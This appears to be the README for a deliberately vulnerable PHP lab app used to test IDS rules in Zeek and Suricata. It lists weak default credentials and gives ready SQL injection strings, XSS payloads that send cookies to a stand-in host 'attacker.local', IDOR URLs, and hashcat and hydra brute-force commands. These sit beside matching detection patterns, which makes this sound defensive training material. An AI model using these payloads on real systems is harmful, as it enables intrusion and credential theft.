# ServiceLink Pro — Vulnerable Lab Application
## IDS Testing & IDRS Project Reference

> ⚠️ **FOR CONTROLLED LAB USE ONLY**
> This application is intentionally vulnerable. Deploy only in an isolated
> network segment (e.g., your ESXi + GNS3 cyber range). Never expose to the internet.

---

## Quick Start

```bash
# Clone / copy project folder, then:
docker-compose up -d

# App:     http://localhost:8080
# Adminer: http://localhost:8081
# MySQL:   localhost:3306
```

Wait ~15 seconds for MySQL to initialize, then open the app.

---

## Credentials

| Username | Password   | Role   | User ID |
|----------|-----------|--------|---------|
| admin    | admin123  | admin  | 1       |
| alice    | password  | client | 2       |
| bob      | bob2024   | client | 3       |
| charlie  | charlie!  | client | 4       |
| diana    | diana2024 | client | 5       |

---

## Vulnerability Map & Attack Payloads

### 1. SQL Injection (SQLi)

**Location:** `login.php` (POST), `index.php` (GET search), `register.php` (POST)

#### Authentication Bypass
```
Username: admin'--
Password: anything

Username: ' OR '1'='1'--
Password: anything

Username: ' OR 1=1 LIMIT 1;--
Password: x
```

#### UNION-Based Data Extraction (search field)
```
# Enumerate columns
/index.php?search=' UNION SELECT NULL,NULL,NULL,NULL,NULL--

# Extract all usernames and password hashes
/index.php?search=' UNION SELECT id,username,password,email,role FROM users--

# Extract version/db info
/index.php?search=' UNION SELECT 1,version(),database(),user(),4--
```

#### Error-Based Extraction
```
/index.php?search=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin')))--
```

#### Blind Boolean
```
/index.php?search=' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='0'--
/index.php?search=' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
```

#### Time-Based Blind
```
/index.php?search=' AND SLEEP(5)--
/index.php?search=test' AND IF(1=1,SLEEP(5),0)--
```

---

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS (index.php search)
```
/index.php?search=<script>alert('XSS')</script>
/index.php?search=<img src=x onerror=alert(document.cookie)>
/index.php?search="><script>fetch('http://attacker.local/steal?c='+document.cookie)</script>
```

#### Stored XSS (register.php → dashboard.php)
Register with a username like:
```
Username: <script>alert('Stored XSS')</script>
Full Name: <img src=x onerror=alert('XSS in name')>
Address:   <svg onload=alert('XSS in address')>
```
Then log in — the payload fires on every dashboard load.

#### Stored XSS via Message Body (dashboard.php)
Submit a message with body:
```
<script>document.location='http://attacker.local/steal?cookie='+document.cookie</script>
```

---

### 3. IDOR (Insecure Direct Object Reference)

**Location:** `dashboard.php?user_id=X`

Any authenticated user can view any other user's full profile, service history,
messages, and MD5 password hash by changing the `user_id` parameter:

```
# Logged in as alice (user_id=2), view admin profile:
http://localhost:8080/dashboard.php?user_id=1

# View all users in sequence:
http://localhost:8080/dashboard.php?user_id=1
http://localhost:8080/dashboard.php?user_id=2
http://localhost:8080/dashboard.php?user_id=3
http://localhost:8080/dashboard.php?user_id=4
http://localhost:8080/dashboard.php?user_id=5
```

---

### 4. Broken Authentication

- Passwords stored as **unsalted MD5** → use `hashcat` or online lookup:
  ```
  hashcat -m 0 -a 0 hash.txt rockyou.txt
  # 5f4dcc3b5aa765d61d8327deb882cf99 → "password"
  ```
- **No session timeout** — session valid indefinitely after login
- **No session regeneration** — session fixation possible
- **No rate limiting** — brute-force login with `hydra`:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
        http-post-form "localhost:8080/login.php:username=^USER^&password=^PASS^:Invalid username"
  ```

---

### 5. Information Disclosure

- Full MySQL error messages and query strings printed to browser
- DB connection parameters leaked on connection failure
- MD5 password hashes visible in dashboard profile section
- Server: PHP version exposed via `X-Powered-By` header
- Directory listing enabled at `http://localhost:8080/`

---

## Zeek / Suricata IDS Rule Triggers

| Attack                  | Zeek Log           | Suricata Alert Pattern                          |
|-------------------------|--------------------|-------------------------------------------------|
| SQLi in GET param       | `http.log`         | `UNION SELECT`, `OR '1'='1'`, `SLEEP(`, `--`   |
| SQLi in POST body       | `http.log`         | POST body contains `'` + SQL keywords           |
| XSS reflected           | `http.log`         | `<script>`, `onerror=`, `onload=`               |
| IDOR enumeration        | `http.log`         | Sequential `user_id=1..N` from same source IP   |
| Brute-force login       | `http.log`         | High POST rate to `/login.php` from single src  |
| SQLi time-based         | `http.log` timing  | Response latency > 5s correlated with SQLi URI  |
| MD5 hash in response    | `http.log`         | 32-char hex string in response body             |

---

## Network Topology Notes (ESXi + GNS3 Integration)

- Deploy this stack on your **vulnerable host VLAN** (e.g., VLAN 30 in your 5-VLAN lab)
- Point Zeek at the mirror port of the switch segment this host sits on
- For Sysmon/Winlogbeat correlation: run `sqlmap` from a Windows host in the AD network
- The fixed subnet `192.168.100.0/24` in `docker-compose.yml` can be adjusted to match
  your GNS3 addressing scheme

---

## File Structure

```
servicelink-pro/
├── Dockerfile
├── docker-compose.yml
├── schema.sql
├── README.md
└── html/
    ├── db_config.php
    ├── index.php
    ├── login.php
    ├── register.php
    ├── dashboard.php
    └── logout.php
```
